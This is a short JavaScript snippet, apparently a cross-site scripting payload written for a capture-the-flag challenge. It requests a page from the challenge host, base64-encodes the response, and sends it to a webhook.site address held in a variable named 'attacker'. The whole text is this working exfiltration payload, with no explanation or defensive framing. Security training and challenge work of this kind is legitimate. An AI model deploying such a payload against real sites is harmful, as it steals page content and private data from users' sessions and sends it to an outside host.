var url = "https://iench2rue.challengecyber.fr/toutou";
var attacker = "https://webhook.site/2b8bb9a9-47c9-4205-a5f9-beea46868d97";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);